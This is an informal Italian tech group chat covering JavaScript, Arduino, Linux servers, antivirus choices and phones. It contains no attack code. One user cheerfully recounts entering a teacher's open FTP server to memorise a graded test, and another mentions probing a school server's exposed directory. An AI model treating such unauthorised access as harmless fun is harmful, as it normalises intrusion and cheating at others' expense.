Sulle mail
Tipo?
Cosa tipo?
Competenze Linux, installazione server minecraft, installazione bot, benchmark etc
Specifica competenza linux.....
Installazione server web. Comandi, script
Ma poi? Cosa ti interessa?
Oltre a rompere le palle dici?
Ma è come se vai a chiedere a Tim Cook di darti il nuovo iPad che non è ancora uscito. Non sono affari tuoi
Vabhe mica ti ha chiesto quanti soldi fa in un mese, non sono cose private queste
No. Se vuoi in privato posso farti una lista di 100 punti perché fa schifo.
Sono volontario
Ahahahaha tipo?
Inizia a mandarli
Ti muto là chat e quando esco da scuola li leggo tutti e rispondo
Non tu, l'azienda in generale
Vabbeh.
Il guadagno se si viene a sapere non fa nulla, ma comunque
 me lo sono perso o ancora non hai caricato nessuna info aggiuntiva sulle parti da stampare?
Così giusto per darvi il

BUONGIORNOOOOOOO
Grazie Cicca!!! Buon giorno anche te 
Questo è il mio buon giorno per voi.... Milano BELLA VITAAAAAAA!!!

Che bello il js
E in Pennsylvania hanno via Raspberry

Oéééé



Qualcuno puoi darmi info su una stampante 3D, la am8??
Non te lo sei perso, sono in trasferta a Pavia dove una tromba d'aria ha scoperchiato un capannone con il fotovoltaico sopra, sto mettendo in sicurezza il tutto.
Lo preparò, tempo permettendo, la prossima settimana.
JS strano non riusciro mai a capire com'e che 5 + '5' = "55" e 5 - '5' = 0  per me qualcosa molto misteriosa,per i altri matematica elementare stile js 
NaNNaNNaNNaNNaN batman!

Perché non puoi sottrarre due caratteri
Beauty
ciao a tutti!
Marco mi consigli una buona ROM per OPO? Io monto l'ultima cyanogen OS stock ma ho problemi sul Wi-Fi che non resta connesso alla rete o non trasmette/riceve nonostante connesso 
Come in molti linguaggi con un po' di intelligenza il + funge sia da somma algebrica che per unire più stringhe e convertire implicitamente numeri in quest'ultime, mentre il - ovviamente fa solo la sottrazione.
Scrivendo 5 + 4 + "3", come output avremo "543", perché il numero 3 in realtà è una string.
Scrivendo 5 + 4 + 3 come output avremo 12, in quanto tutti gli elementi sono numerici, e quindi il + funge da somma.
In un qualsiasi linguaggio decente inserendo una string in una sottrazione il programma tira un'eccezione.
5 - "2" -> muore male il programma
5 - sbyte.Parse("2") = 3
(
)

In JavaScript invece questo parsing lo prova a fare in maniera implicita da solo, quindi 5 - "2" = 3.
funzionano se create un account coinpot anche se non ti da molto in un giorno
li condivido in caso vogliate provarli
Sono referral
ahahahahahah
Yess
Ciao ragazzi  
Un po' di giorni fa ho scritto qui se era fattibile creare un server web basato su raspberry pi che "trasferisse" i dati da una seriale ad una pagina web e tenesse un log degli stessi su una usb.

Da lì ho cominciato ad informarmi un po' sull'argomento 
(essendo un novello completo in questo) ma ho trovato pochissime informazioni a riguardo... 
Quindi come potrei fare ?? Non voglio pezzi di codice da fare copia/incolla ma vorrei capire il funzionamento per poi in futuro poterlo modificare 
Grazie
Sto programmando il DHT11.. come continuo?(queste informazioni le ho prese dal datasheet)
Cosa devi fare?
Codice da riutilizzare e modificare?
Pin Mode va nel setup
Cerca su internet il codice, magari se scopri qualcosa che non va (difficile ma possibile) lo modifichi.
Mi serve per giocare online, come vi sembra?
E bello
Se vuoi che i dati si aggiornino in tempo reale allora devi usare i WebSockets, altrimenti vai di Long Polling HTTP
Ok capito 
Vorrei che si aggiornasse da sola ogni 30-40 secondi
Quindi in pratica un programma legge la seriale e salva i dati su un file nella usb, un'altro programma (quando richiesto) legge i dati piu aggiornati del file e li spara in una pagina web
ragazzi
devo blindare il pc
consigli?
Ti consiglio Python e Flask per iniziare a costruire il tuo WebServer
Si esatto
il mio piano è: antivirus, vm, sandbox,firewall e altro
aiuti?
Di sicuro la base piu consigliata è una distro linux solida tipo debian con firewall software tipo ufw, poi virtualbox con un os che vuoi tu (l'antivirus serve solo se scharichi schifezze o usi software che potrebbero aprire buchi nella sicurezza)
Ok adesso mi informo

no, mi serve win, sono giò su linux
Win lo butti nella macchina virtuale se serve
Allora per le applicazioni Windows usa Wine (che NON È una VM)
è già in vm infatti
lo so
E allora hai già risolto la maggiorparte dei problemi
ma ho pensato che a questo punto è meglio una sendbox
ma voglio fare di più
Io piu che usare un firewall, una vm e negare tutti i permessi di amministrazione non saprei come proteggerla la macchina (se non staccarla totalmente da internet e impedire l'uso di qualsiasi periferica)
no, internet mi serve....
antivirus e malwarebytes?
Ahn dimenticavo 

la pagina web del Raspberry non deve essere raggiungibile dall’esterno ma solo dalla Lan
Servono solo se usi o scarichi merda o visiti siti non affidabili
infatti è quello che devo fare 
o meglio...devo analizzare backdoor, rat e trojan
Per quello basta impostare una porta diversa da 80, 443, 8080 e impostare il firewall del router
bitdefender o avast?
E allora usa un qualsiasi antivirus, io sul mio pc usi avast solo perché non rompe troppo ed è gratis
bitdefender?
Non lo ho mai provato, prova a cercare online un confronto tra i due
come firewall invece?
Ok capito quindi non mi cambia nulla a livello del server ma solo dal modem 
Ok buono a sapersi 
Ufw è il piu diffuso, che comunque va ad agire sul firewall integrato di linux (iptables)
Yep, è il router (e in caso il firewall di linux) che limita l'accesso dall'esterno della rete locale
eh ma esiste solo per linux
Infatti lo configuri su linux, windows ha il suo firewall integrato se proprio vuoi una cosa doppia
ma quello win è....è su win, un motivo ci sarà
Non penso ci sia di meglio su win, se l'os fa acqua da tutte le parti non esiste software che possa arginare la cosa
ahahahahahah
Per esempio ufw su linux non è altro che un programma che semplifica l'uso di iptables che è un firewall integrato in linux
grazie mille per i chiarimenti

Ragazzi cosa ne pensate di Comodo come antivirus? Al posto di Avast, ho letto in AVTest che è tra i migliori
Ah, se vuoi un firewall migliore di quello di linux ti conviene investire soldi in un firewall hardware di quelli che usano nei server professionali 
seeee non ho tutti quei soldi 
salve a tutti
E via di firewall netgear o cisco 
insieme a quello vanno via bei soldi
Infatti ho messo 3 mazzette di banconote da 100€ 🤣
No, mi serve nel loop
Risalire all’umidità e alla temperatura
Raga come si chiama quel bot he fa da tag allert?
Non l'ho mai usato ma ho sentito parlarne bene, come d'altronde di Avast, Kaspersky, MB ecc.
Io sinceramente non ti consiglio di usare un altro antivirus in quanto secondo me Defender (integrato in Windows 10) protegge sufficientemente, la cosa che ti consiglio è di stare attento alle cose che scarichi, tutto qui.
Potresti provare una soluzione come la mia, io ho un server DNS privato (basato sui DNS di CloudFlare) al quale ho applicato una blacklist con domini contenenti malware, pagine di phishing e ads invasivi (
), in questo modo la maggior parte dei malware verrebbe bloccata prima di raggiungere il tuo PC.
Quando provo a visitare una pagina che il mio server DNS ha in blacklist mi appare un bel "Blocked by Switchando, clicca qui per proseguire lo stesso"
ahahahahah meriti ignuranza a sto giro 
Mai preso un malware con questo setup
L'ultima volta che ne ho preso uno (era un adware) avevo Windows 7 senza antivirus
parlo fi quello che hai detto su defender
Ti dovresti aggiornare un po'
Windows Defender di Windows 7 era veramente scandaloso
Questo nuovo è molto meglio
ma non paragonabile comunque
Ma chi sta dicendo cosa, sto dicendo che secondo me un po' di attenzione e puoi farne a meno dell'antivirus, poi se sei come il mio prof che apre i .pdf.exe allora questo setup non può funzionare

Comunque anche io mi trovo bene solo con Defender
Oh oggi ha eseguito un palese virus da chiavetta USB davanti a me
Era fatto così male che tra poco si chiamava "sono un virus.exe", ci mancava poco
Erano fatti meglio quelli che giravano ai tempi di XP... Che aprivi la chiavetta e ti trovavi un collegamento alla stessa dentro, ci cliccavi e in realtà il collegamento ti apriva un .exe nascosto
 nooo
la tua live è in contemporanea con quella di OnePlus
Ma infatti la vediamo in diretta
ah lol, non avevo letto
apposto
Ragazzi posso porvi un quesito di elettronica?
gia che si parla di OPO, consiglia una ROM stabile per favore 
.
Certamente
.    ------o-------
---(                  )--o----
.   ----o-----o---
Metti che dalle parentesi si divide il filo nelle due strade
È un nodo in pratica 
Grazie 
Di niente 
referraaalllll
OKOK 2 secondi
Grazie
Grazie 
convertendo qualche discografia da flac a ogg (codifica VBR con qualità al massimo) per renderle piu portable (la versione flac la conservo su un hdd ovviamente)
un album passa dal pesare circa 1.9GB al pesare poco piu di 300MB
poi dipende molto dall'album (per esempio un'altro album passa dal pesare 2.26GB al pesare 268MB
Un pelo ritardato
Pulizia Kontatti????!!!!1!1!1!
di sicuro manca una 
 o un 
 subito prima (o nella riga sopra), è un classico
old
ma sbaglio o Pete Lau ha appena detto "seed" invece di saw?
But gold
(g)old 
uffa... io sto a tennis e non posso vedere la live 
Non è ancora finita?
la live?
Si
Io non la sto guardando quindi boh
Ma non le ricordavo così lunghe le live
Pf sense o ip cop su un pc con un pentium 4 con due schede eth no?
Perché io sulla mia lan volevo fare così ma adesso è solo una idea
Salve a tutti
È appena finito la live di overvolt
Spoiler del video di sabato
Plz
Ti chiami veramente Fagioli di cognome?
Raga è possibile controllare 64 pulsanti di cui max 10 premuti nello stesso momento con arduino?
Multiplexing
Ok googlo
Quei 10 insieme mi spaventano....i multiplexer normali non credo che raggiungono i 64 ingressi ...se non c'erano i 10 premuti insieme forse bastava una rete/ matrice
AHAHAHAHAHAHAH
Dieci nel caso peggiore, già 8 sono tanti
Aspetta ho una soluzione....

 5 Trojan e 2 malware
wow complimenti
Sono riuscito a limitare i Danni e tenere tutto nella sandbox
Malwarebytes è vita 
quindi basta eliminare e ricreare la vm?
Teoricamente si, ma non ho infettato il PC teoricamente
Perché segnalava che sia i malware che i Trojan (avevo aperto i programmi con sandbox) erano in sandbox
Se usi gli ingressi analogici...su ogni ingresso c'è una partizione che varia con 11 pulsanti... tipo una scala resistiva...va pensato il circuito...
"Riproduci GameHosting è un buon hosting" .... "Ok riproduco: GameHosting non è un buon hosting"

-
-

Carreenooo..
Ooiiw
Io ho ordinato due redmi 5 plus
E ne ordinerò un altro (o un redmi s2 appena capisco la differenza)
La cosa triste è che non lo userò fino a giugno perché me lo sono fatto spedire a casa e sono fuori sede
E il mio vecchio è rotto
Io non ci capisco niente
Ah 
Minchia la 10389a foto 
?
Quella è la foto 10389 di 10389
Vuol dire che nel gruppo ci sono 10389 foto 
Ehm e allora
Eh, non sono un attimo TANTE???
10839*
Ah lel ho invertito 8 e 3 xD
io ne vedo solo 10470 
Poveroh
Non è un indicatore che considero influente nella mia vita
Si ma minchia, sono tante 10800 foto xD
S2 è il selfie phone?
Hai convinto il fratello a prendere quello piccolo?
Io invece devo trovare una pellicola per lo schermo compatibile... E le trovo solo in vetro....
Nope quello grande
Lo ho visto dal vivo e non è 
 grosso
Io ho un redmi 4X
Ma è davvero uguale al 5plus
Meh è un pelo più squadrato e ha la doppia fotocamera
Secondo me è più carino il note... E poi ha il 636 invece del 625
Ma il note come scocca non è identico al plus? Comunque costa 200€ molto di più
Nope
Questo è il 5 plus
Non è uguale?
Su Amazon vendolo le pellicole dicendo che sono compatibili con entrambi
Spe il retro è diverso


Poco copiato mi dicono
Raga
Dica
Non riesco a capire la sequenza da inviare ai pin di comando di un l298 per comandare uno stepper
Voi sapete la sequenza?
Non ho la foto del retro ahahahah
Ah giusto che non lo hai Ahahaah
Ahhaah mio padre ha fatto la foto solo del davanti hahaha
Questo è per due motori normali... A me serve quello per il singolo stepper
Va beh cambia la fotocamera e basta
Avessi l'oscilloscopio da 4 ch lo avrei trovato... Ma ne ho uno dei due... Fino a che non arriva l'assegno dal ministero 
Ah scusa 
Aspetta
Sattoh non è poco
Comunque alla fine lo ho preso da geekmall
Questo ha la libreria quindi non vedo la sequenza
Infatti io avevo caricato sull'arduino quel programma lo per vedere la sequenza che mandava in modo da replicarla su labview
Ma avendo solo due canali non so come vederli insieme
perche devi replicarla in labview?
Devo usare una myRIO come controllo
non so cosa sia e a questo punto non so dove trovare questa sequenza
Sì
Ok che sono stupendi sti sticker... Però...
già mi immagino il codice, spaghetti intensifies
Avete visto le OnePlus bullets wireless?
Come avete convinto marco per fare quel primo sticker?
Ci ha pensato lui da solo a convincersi
Ah

ha mandato la foto lui dal nulla 
Lol
e questo ahahahah
marco vi avrà ammazato 
ma tipo l'ha proposto lui mi sa
Ahahhahahhahahah
raga non potete capire cosa sta succedendo
cos?
rubano il prosciutto
sono gli austriaciiiiii
parliamone.
Ah AHAHAHAHAAHH
ci rubano un cotechino?
In quel gruppo sto pure io
io pure
Firmate?
si
avoglia
yesn't
HAHAAHAHAHAHAHAH
suona tanto bene

 ‎€4‎.0‎0 ‎in‎ve‎ce‎ c‎he‎ €‎8.‎49
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 5‎2.‎89%
 Store: Banggood
 

 e per cosa più? 
QUANDO IL TUO PC è A 29gradi


in idle?
Accendi il camino, poveretto! Muore di freddo!
sto cazzeggiando sul web
hahaha quando gioco arrivo a 50gradi
e stai con il nepton?
si
quanto costa?
pasta termica della noctua (da un anno che non la cambio)
mh mi sembra sul 100
quella inclusa?
non ricordo
azzarola
no no
cioè quella c'è l'ho ma ho usato quella della noctua (ho letto e mi sono informato e ho visto che è una delle migliori)
Sera, ragazzi potreste darmi una mano a capire che driver board dovrei usare o almeno che connettore usa questo schermo:LTV350QV-F02 ?
Ho guardato il datasheet ma non ci sono riuscito a capirlo
Io una sono spesso intorno ai 70 se gioco
ma io sono senza scheda video ‍♂️
AH
ho tante, tantissime schede di chrome che occupano 1,50gb di ram
uso la gpu integrata di un i7-7700k

e non lo spengo da...........
domani carico e mi compro la 1050Ti
6 giorni
è il caso di spegnerlo?
haha
ma perchè sprecare corrente inutile
sono arrivato fino ad 31 giorni di attivita
a

poi la ram era diventata un harddisk
era al 80% fissa
Spegnilo di notte o quando non lo usi... Sai la corrente che ciucci...
bah, non pago io ahahahhah, no scherzo
nn ho voglia
Si perde troppo tempo a spegnere
me lo spegni tu davide con anydesk?
ma cosa ca
ah era ironico
No sono serio
.-.
Se ci tieni
vai
L’ultima volta che ho riavviato il pc è stata a maggio del 2017
Ed avevo ricompilato il kernel
nn ci credo
è impossibile
Fa come vuoi
1 anno di attivita ?
Rimanda, stavo scaricando l'app
Già
Ovviamente non uso Windows
impossibile
Perché non dovrebbe essere possibile?
a parte che consumate un botto di corrente inutilmente
UN'ANNO è IMPOSSIBILE.
Ho 30 GPU che minano
Perché? Ho server con Redahat accesi dal 2009
ah ecco perchè mi dimmera la luce in bagno
Ahh
ora si spiega tutto
seeeeeeeeeeeeeee poi?
Mi sto connettendo
Chi cazzo riavvia i server?
Manca solo la tua autorizzazione
sorry, gia spento
aghahahahha
Wow
Ccezionale
il tuo pc è impossibile
dal 2009 non ci credo manco morto
boh io lo spengo ogni sera
Spiega perché dovrebbe essere impossibile
🤷‍♂
Tu riavvii i server? A che pro?
PERCHè 10 ANNI DI ATTIVITà CONTINUA è IMPOSSIBILE
ALMENO UNA VOLTA L'HAI RIAVVIATo
sorry pesavento
No
Sempre acceso
calm down
Se lo riavvio è un disservizio per 35k persone
Inoltre non ha senso riavviarlo per nulla
beh peró
e per evenuali blackout?
dal 2009 avrai aggiornato qualcosa no?
Ok, non ho tempo di ascoltare ca****e
Bah ovvio
hai ups dedicate giusto?
Nessuno ci crede. Ciao
In stile linus tech tips
yum update ed aggiorni
17.000 dollari di UPS da server
Senza riavviare
Ho degli UPS
Ciao
eh capirai, se non riavvii non si aggiorna tutto
Invece
quante ore tengono acceso tutto?
Hai mai usato Red Hat?
no, è impossibile aggiornare 
 senza riavviare
Io si una volta
Per ora c’è stato 1 blackout durato 15 minuti
Ascolta. PER AGGIORNARE BISOGNA RIAVVIARE PERCHÈ VENGONO COINVONTI ANCHE GILE DI SISTEMA
Ah ok
.
Basta riavviare i servizi senza riavviare tutto il sistema
Senza urlare eh
Linux isn't like Windows 
Per fortuna direi
e se c'è un update del kernel? che fai, lasci le robe del 2009? sono un peletto indietro
Ahahahahah
Vabbeh ciao
Vuoi il kernel 4.16 su RedHat?
Se bisogna aggiornale qualcosa del boot lodare?
Loader
Cazzo me ne frega del boot loader se manco lo riavvio?
Nn riavviamo?
eh vabbe non li spegne mai a che c@zzo gli serve il bootloader
Ahahahahahah
Il bootloader lo usi per avviare e basta
no, ma io preferirei mandare un servizio down per quei 10 secondi che serve a riavviare piuttosto di avere cose vecchie
Ovvio
Eh si
Su red hat tutti i pacchetti sono vecchi
Si vede che non l’hai mai usato
10 secondi di avvio?
Eh si
Sta ******
Con 9 anni di attività si sarà fottuto qualche condensatore?
se è una VPS anche sì
Mi sembra un po' surreale 10 secondi di avvio
Per ora mai
Ma sono dedicati
Dedicato
adesso cronometro, aspe 
non hai sentito che ha degli UPS?
Il mio pc con Gentoo ci mette 7 secondi ad avviarsi
Uso solusvm da anni e almeno una volta ogni due mesi devi riavviare per aggiornamenti
Il mio con Windows c’è ne mette 7 hahahahah
Io mi immagino la scena di pigiare il tasto di riavvio per sbaglio
Se lo dici tu

22 secondizz
Lo dico io. Lo dicono tutti
*BESTEMMIONI TIME*
Fatto sta che non riavvio dal 2009
Ce qualche processo di sistema attivo da 9 anni ...
nginx è attivo dal 2016
Comunque la ram (se non hai 4TB di ram) ogni tanto deve essere riavviata per essere svuotata naturalmente
Senza mai reloaddarlo
Allora
Questo su Windows
Ovviamente se si fotte qualcosa hai una mobo ridondante? right?
con chrome
Ok, basta dire minc****
che di TB di ram ne consuma pure 5
Ovvio, è un dedicato mica il server che uno si tiene a casa
Madonna che è
Lo uso solo per reverse proxy nginx
Ecco cos’è
tu calmati, che così non fai nulla di utile
Comunque pensala come vuoi
Eh zio ma saranno passate un botto di versioni dal 2009
Applausi
Sorry
Anche le ventole....9 anni che girano
Eh vabbuo
Infatti mi ha aggiornato il pacchetto
che ci vuole a swappare le ventole mentre il coso sta funzionando

Ma da che hosting l’hai?
Un po’ di educazione per favore, non sono tuo fratello
Self hosted in ditta
Ora non pretendiamo troppo
beh, poi se anche stai 1 minuto senza ventole il pc funziona lo stesso 
Scusa,
come a scuola da noi
Sta nella ditta di mio padre ora
Ah, sei serio?
il sito è sul rack in sala server
Spero ci sia almeno la gigabit nella scuola
Avoglia
Almeno una volta in 10 anni sarà saltata la corrente (l’ups non dura 10 anni)
che scuola fai per avere la gigabit?
Ti cosa hai?
ora da noi hanno rinnovato TUTTO
La mit
e poi c'è la mia scuola che ha il server con WINDOWS SERVER
Una volta, per 15 minuti
6GB/s
Rete aziendale
1) non è una scuola
2) sì dovrebbe dire "il MIT"
se c'è un black out la corrente poi torna anche 
Ma aspetta
ITIS Informatico
Vanno cambiate le batterie al piombo....dopo tot anni di carica
è anche una cisco accademy
Calmanti sapientino
calmissimo
ed il sistema informatico (registro etc)interamente sviluppato dai prof
sei tu quello che si è scaldato 10 minuti fa insultando Buffer Overflow
Ma è in via caldera 21?
ti ha solo detto due robe, eh
nope
Con un tono ecco...
Non c'erano le ventole per un minuto
Suppongo a Milano
Chissà che divertimento a trovare le vulnerabilità
un tono lol, stiamo scrivendo
Ahahahahahah
già trovata una
grossa
^
in pratica una cartella non era protetta e si entrava con apache nelle directory del server
Ma che?? io sto in puglia a san giovanni rotondo
magari a milano
Non era rivolta a te
A 
Per avere la 6gb/s
Ah lol pensavo chiedessi della scuola
Madonna serio?
Manco Aruba l’ha 
UUH il divertimento
Non siamo neanche in Italia
Si ahahahahah
Dove?
New Mexico
La mia ha il server dove ci sono tutti i libri di scuola che è un Windows server con cartella condivisa
Ecco che si spiega la 6GB/s
Windows server...
SERIAMENTE USATE SAMBA?
Usavamo
Ora hanno appositi nas
Fiuu
alle medie successe una cosa epica
Del tipo?
La prof caricò la verifica già corretta nel server FTP open pronta per essere stampata
si da il caso che il giorno stesso mi venne la pazza idea di entrare in questo ftp
giorno dopo la prof se ne viene : Vittorio, 10! Complimenti!
in pratica ho imparato a memoria le crocette
io vado che domani mattina ci si sveglia alle 6
Hahahaha
Ciaoz
ciaoooo
E poi c'è la mia scuola che non ha un server e usa Joomla.
Non se lo copri con le polpette 🧐
Davvero? Allora stiamo vicini
Wooww
La nostra win server 2003
Il server si chiama alanturing lol
Lulz
Quale?
Niente, scherzavo
Ragazzi potete darmi info sulla anet a8??
questa foto fa tanto House of Cards :D
Tanto
K.
Ti sei mai visto un porno in 3d con la cardboard?
Nnno
Però a pensarci
Ci sta
Appunto
Ci sono pure quelli in first-person
Solo che devi tenerti il cardboard spiaccicato in faccia che non si regge da solo
Eh vai di elastico
usa la fascia per capelli
Comunque di commenti su Play Store ne ho letti
Ma dopo questo potete chiudere internet
Beh ha ragione
La gente non ha il minimo rispetto, né sa cosa significhi questa parola 
Io uso sempre il VR
Beh è una figata
C’è il problema di sporcare ovunque però
Non vedi niente
Eh vabbè Bast prendere precauzioni

Che brutto modo per usare una fascia per capelli..
almeno è sicuro che non cada il cardboard
 non usero' piu una fascia per capelli..
Vabbè ma te la metti in testa

🤔ma solamente a me sembrano tanto dei deportati con quel cappello e quella camicia a righe? manca giusto giusto l'SS con il mitra
Lol
 guarda che S.O. utilizzano  minuto 7:10
Eeeh che ti devo dire
Che è il migliore
\ban
Buongiorno regaz chi mi può aiutare a fisica
 no, mi pare sia un ingegnere
Speriamo può
Si chiedi pure
Tra 5 minuti verifica

A true story 
Solo 8%?
Volevo sapere le differeze con altre stampanti e la risoluzione della anet.. thanks in advice..
Lol
Spotto 
 in mensa
(spero di aver beccato il Lorenzo giusto )
Hey you
This explains everything



by 
THIS IZ HORRIBLE
Qui c'è qualcosa che non <br>
quando scrivi in latex/html e poi salvi in .txt
  
Ancora aspetto l'aggiornamento per creare gruppi dove può parlare uno solo
Poi sarò felice
Woot??
a che servono i canali su whatsapp?
A fare le live
ma whatsapp secondo me non ha futuro
più l'aggiornano e più peggiora
stanno copiando tutto da Telegram
ogni aggiornamento che fa è qualcosa di più vicino a Telegram
raga, ma Telegram funziona in cina
sta puntanto tutto sul diventare un posto in cui farsi una reputazione "stile instagram" diciamo
e per rimanere credibile come app di messaggistica scopiazza robe da telegram
a proposito di Instagram
Senza VPN/Proxy no
sono geniali, non puoi condividere un post di Instagram su Telegram, solo su WhatsApp
questo spesso mi obbliga a usare WhatsApp anche se i miei amici hanno Telegram
no, come anche WhatsApp e tutte le app di messagistica
a me sinceramente instagram fa cagare... almeno per come lo usano quelli della mia età, tutti a farsi selfie e a far vedere il proprio lato esteriore a suon di filtri e like
ma non credo sia solo da me .-.
in cina sono vietati pure i film a tema politico, quindi figurati se permettono alle persone di comunicare senza rendere il governo partecipe della chat
Chat P2P criptata masterrace
o VPN
piazzi una VPN e via
Oppure usi TOR per accedere ai siti bannati
ma non ho il martello 
Ma 
Quando ero in cina, e in chat si parlava di politica la chat si bloccava
allora a sto punto mi prendo una vpn e sono a posto
idem, soprattutto con skype
Usavo qq
Vai in cina?
Comunque è una cosa illegale lì accedere ai siti bloccati, quindi anche se usi una VPN non ti devi far beccare
Poi anche Android è praticamente bannato in Cina
Cioè, funziona ma non puoi avere Google Play Services installato
si fra 1 settimana
Ergo niente app di Google, nemmeno Play Store
uh, che vira
vita
Corea del nord V2
Corea del nord: molto piu chiusa
c'è un intranet
In Corea del nord non c'è internet
Non c'è Windows
Non c'è MAC
redstar
os
C'è una sola distro Linux (Red Star)... Che è illegale
Non rispetta la licenza del kernel Linux
Eppure lo usa
ha anche dei suoni di kaspersky
tutti stanno zitti, non si sa mai. forse arriva una bomba sulla sede di linux a san francisco
Ya
uAU
Ma è più freddo della temperatura ambiente
Cazzo ha l'aria condizionata per raffreddarlo?
hahahhA
io ho direttamente i tubi dell'acqua fredda che entrano del dissipatore della cpu
nepton della cooler master
haahhahaha
ma abiti al polo nord?
serio ???
E la bolletta dell'acqua quanto ti costa? 
hahahahhaa poco
haha no ma avevo la finestra aperta è la camera era tipo a 23gradi forse
madonaaaaaaaaaaaaaaaaaa
se fai un circuito chiuso nulla
Cazzo scalda 6 gradi wtf
era in idle (più o meno) perchè stavo sul web
(Tralasciando che d'inverno anche io ho 20-25°C sul processore)
con gta V a dettagli bassi) scalda a 50grada circa
(senza scheda video)
oggi la compro ❤️
(la gtx1050Ti)
Ma
Almeno una 1060 6GB prendila
La 1050 Ti ci manca poco che non tiene manco il Full HD con grafica alta
loooooooooooollllllllllllllllll
Ma cos
Se ve lo steste chiedendo
❤️
Ma da quando i mod possono warnare altri ""staffer""?
da sempre, ricordi quanti warn ci lanciavamo tempo fa? 
Ah
Staffatori
Più che altro non sono nello staff di questo gruppo ma per il bot sì, ho il permesso di cancellare messaggi
ma per far parte dello staff?
mee tooooo
Ah
ai lov i5 6600k
Non puoi decidere tu di entrare, se serve altro staff Marco (quello Romboli) setta staff le persone più serie
non è vero
dipende pure da cosa ci devi fare
Devo togliere gli helper, è vero
non si può, così dal nulla
ecco
se è per questo devi anche fare pulizia, da un mese ormai 
:c
Vabbe che tanto non ho poteri ugualmente 
hehehe
Qualcuno di voi ha una playstation 2 Fat? Ho una domanda
io ce l'avevo, dica
Hai una foto?
Non mi funziona più Chrome 
io
Mica mi puoi mandare una foto?
è in garage
Il suo software non è compatibile con Linux ragazzi

 ‎€9‎8.‎29‎ i‎nv‎ec‎e ‎ch‎e ‎€1‎37‎.25
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 2‎8.‎39%
⭐️‎ 4‎.5‎0 ‌‎/‌‎ ‎5.‎00
 

funziona su linux
l'ho
Chissà perché pure io ma non funziona
Ma cosa vuol dire il suo software... È un dispositivo di archiviazione esterna 
Ha un suo software, per l'analisi del disco è per nascondere dei file
ma resta comunque un harddisk anche senza software 
Per nascondere i file ci metti un . davanti al nome
per carità...Maxtor=Seagate..i peggiori hard disk esistenti
Ciao raga
Ho un problema di informatica che non riesco a fare
Come faccio a cancellare solo un elemento in una lista in c?
Non so Come risolvere il problema
Se è allocata staticamente, l'unica possibilità è mettere l'elemento che vuoi eliminare in fondo all'array e ridurre di 1 la variabile dimensione dell'array (in realtà il valore resta). Se invece hai un array dinamico basta usare il comando per eliminare una riga (in c++ 
 e riduci la variabile dimensione)
Grazie Milla frate
L'array ha una dimensione data da un define
In pratica devi fare la lista della spesa
E mi manca solo quello
Con le strutture
scrivi messaggi più lunghi invece di mandarne 10 
Se la dimensione è data con un define non la puoi modificare, quindi l'unica soluzione è sovrascrivere con un bel NULL invece che camcellare nel vero senso della parola
Come si fa
A livello di codice
Che palle abbiamo un prof stupido le spiegasse ste cose
Grazie mille bro
Che poi veramente vi fa usare un array statico di struct?
Facesse almeno un array di puntatori a struct allocate dinamicamente...
Ora che ci penso in realtà questo potrebbe non funzionare, dipende da come è stato creato l'array
Si è un piciu
Ci fa sempre usare i define
Ho provato ma non riconosce le cose
Poso vedere come è definita la lista?
wtf
aaahhh capito  pensavo che ha sbagliato l'autore
Benvenuto!
CIao,sono la gamba della giustizzia,chiedo rispettoz!!111!!11!!!
Mah... Ormai con gli IDE moderni questi errori si trovano subito... Non ti fanno nemmeno compilare...
si infatti
Wtf
anche il visual studio,fa tutto in un modo ordinato,trovi subito l'errore
Lo so
Switchando è programmato con Visual Studio
Non sai quante volte mi ha salvato la vita quell'IDE
?
Visual Studio merda
È fatto dalla Microsoft
Appunto
Ok capito, il modo piu facile per eliminare un elemento della lista è prendere l'ultimo elemento della lista, usarlo per sovrascrivere l'elemento da eliminare e poi decrementare di 1 "nProdotti"
Direi che alla Microsoft ci lavori gente competente
Non uso nulla che sia della Microsoft, backdoor di merda
Ma dove ahahahah
Windows 10 è uno spyware
Puoi disattivare tutto
E quando lo installi ti chiede se vuoi che invii quello che scrivi o meno
Lol
Che fa aggiornamenti di windows che mandano a puttane i driver e quindi fino a quando non viene aggiornato windows di nuovo o il siddetto driver si rimane con una periferica non funzionante (a meno che non si annulli l'aggiornamento)
Resta comunque spyware, succhia risorse e Cortana non serve ad un cazzo, se la disabiliti rimane comunque il processo in background
Tra l’altro
Cortana io la uso
AHAAHHAAHA, a cosa ti serve?
Cortana è inutile
Promemoria, sveglie, calcoli, ricerche al fly, gli chiedo cose mentre gioco
Windows è buono solo per giocare, fa cagare sui server, sull’IoT e moltissime altre cose
Capisce una volta su 10 se va bene
È completamente inutile e poco Smart
1) con me ci prende quasi sempre pure in italiano
2) mettilo in inglese e vedi come va
Un InFo PlEaS3.... quali di questi servo è migliore, MG995 o MG996R? Chi può darmi una mano?
996
Promemoria e sveglie le gestisco sul cel, le poche volte che devo fare calcoli uso il collegamento su start, per le ricerche premo alt-tab e vado sul browser che tengo sempre aperto, mentre gioco gioco e non penso ad altro
il movimento è più fluido?
È semplicemente una cosa in più che può tornare utile
Tra l’altro Windows per programmare è scomodo come una matita nel culo
Boh il numero è più grande
🤣
A me succede, soprattutto in questo periodo che sto male di bronchite e polmonite che mi prende e mi addormento mentre uso il PC qualsiasi ora del giorno, è comodo chiedere a Cortana di risvegliarti dopo 10 minuti
Appunto, un "in piu" che se si potesse spegnere del tutto sarebbe meglio (e invece se ne resta in background a succhiare risorse e raccogliere dati anonimi)
Ma non si poteva disattivare?
Già, soprattutto in c/cpp
Disattivare, non spegnere totalmente
Si ma resta comunque, occupa 100Mb di ram anche da disattivo
C++ usi Visual Studio
Per il C potrei capirti perché fanno cagare tutti gli IDE
Ma anche no
Mi fa cagare sia come ide che come compilatore
C/C++ con vim
Vim + g++
Solo il processo di Cortana in background occupa la stessa ram che occupa il mio sistema in idle
Mi puoi dire tutto ma non che visual studio sia un IDE di merda
Quando non ho voglia di riavviare il pc per far partire linux uso wsl che per programmare su windows è la cosa piu comoda che esista
Non ho detto che è un ide di merda, ma che a me fa cagare
E citando le parole di un prof universitario "il compilatore microsoft è molto piu permissivo e di default importa molte librerie a differenza del compilatore linux"
sul compilatore C++ non so dirti perché non l'ho praticamente mai usato, io uso il .NET Core, che è un framework simile al .NET ma è open source, multipiattaforma, più leggero e più veloce del .NET "normale", e mi ci trovo da Dio.
The Four Horsemen of the Apocalypse



by 
parlavate di questo?
eh??
Con google assistant posso accendere le luci di casa mentre sono fuori casa?🤔
maccos
Benvenuto!
yep, se hai delle lampadine smart supportate da Assistant
altrimenti devi usare Switchando e ti rimando a questo video:
